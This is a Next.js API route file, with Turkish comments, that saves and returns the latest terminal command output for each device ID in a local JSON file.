import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

const RESULTS_FILE = path.join(process.cwd(), "scripts", "command_results.json");

export async function POST(req: Request) {
  try {
    const { deviceId, output } = await req.json();
    if (!deviceId) return NextResponse.json({ ok: false });

    let results: Record<string, string> = {};
    if (fs.existsSync(RESULTS_FILE)) {
      try { results = JSON.parse(fs.readFileSync(RESULTS_FILE, "utf-8")); } catch (e) {}
    }

    // Sonucu kaydet (Her cihaz için sadece son terminal çıktısını tutuyoruz)
    results[String(deviceId)] = output;
    
    fs.writeFileSync(RESULTS_FILE, JSON.stringify(results, null, 2));
    
    console.log(`[RESULT RECEIVED] Device: ${deviceId}`);
    return NextResponse.json({ ok: true });
  } catch (error) {
    return NextResponse.json({ ok: false });
  }
}

// Sonucu okumak için GET metodu
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const deviceId = searchParams.get("deviceId");
  
  if (!deviceId) return NextResponse.json({ output: "" });

  if (fs.existsSync(RESULTS_FILE)) {
    try {
      const results = JSON.parse(fs.readFileSync(RESULTS_FILE, "utf-8"));
      return NextResponse.json({ output: results[String(deviceId)] || "" });
    } catch (e) {}
  }
  
  return NextResponse.json({ output: "" });
}
